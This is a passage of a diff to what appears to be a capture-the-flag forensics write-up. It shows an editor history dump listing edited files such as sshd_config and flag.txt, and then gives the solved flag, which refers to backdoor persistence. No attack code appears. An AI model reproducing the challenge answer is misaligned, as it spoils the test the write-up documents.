+	+	15	23
+	+	17	37
+	+	7	25
+	+	18	23
+	+	19	0
+	+	22	61
+	+	23	42
+	+	26	14
+	+	22	10
+	+	23	17
+	+	26	40
+	+	27	50
+	+	29	25
+	+	30	0
+	+	30	61
+	+	5	33
+	+	17	51
+	+	23	30
+	+	26	38
+
+> /tmp/p.c
+	*	1624440352	0
+	"	17	30
+	^	17	31
+	.	17	30
+	+	1	17
+	+	2	18
+	+	3	22
+	+	5	6
+	+	1	0
+	+	2	0
+	+	3	0
+	+	5	22
+	+	6	23
+	+	7	34
+	+	8	34
+	+	12	72
+	+	13	34
+	+	17	48
+	+	23	24
+	+	26	0
+	+	4	20
+	+	7	32
+	+	8	9
+	+	7	0
+	+	8	0
+	+	9	34
+	+	11	0
+	+	12	4
+	+	9	14
+	+	12	31
+	+	13	28
+	+	12	26
+	+	15	0
+	+	14	28
+	+	16	11
+	+	17	52
+	+	18	0
+	+	19	28
+	+	20	16
+	+	22	0
+	+	23	32
+	+	24	0
+	+	20	5
+	+	17	30
+
+> /etc/ssh/sshd_config
+	*	1624374598	0
+	"	36	0
+	^	36	0
+	.	32	0
+	+	32	0
+	+	36	0
+	+	32	0
+	+	36	28
+	+	32	36
+	+	34	12
+	+	32	1
+	+	34	1
+	+	37	0
+	+	32	0
+
+> /var/lib/ftp/note.txt
+	*	1624355408	0
+	"	5	22
+	^	5	23
+	.	5	21
+	+	5	21
+
+> /etc/vsftpd/vsftpd.conf
+	*	1624353360	0
+	"	117	0
+
+> /etc/ssh/ssh_config
+	*	1624351938	0
+	"	46	0
+	.	47	0
+	+	46	46
+	+	47	0
+
+> /etc/hostname
+	*	1624349157	0
+	"	1	8
+	^	1	9
+	.	1	8
+	+	1	8
+
+> ~/flag.txt
+	*	1624280143	0
+	"	1	24
+	^	1	25
+	.	1	12
+	+	1	12
+```
+
+If we look in the registers we can see that our flag is saved here.
+
+Done! We have our flag "`flag{b4ckd00rs_4r3_us3full_f0r_p3rs1st3nc3}`"
 
 ## Know your enemy
 
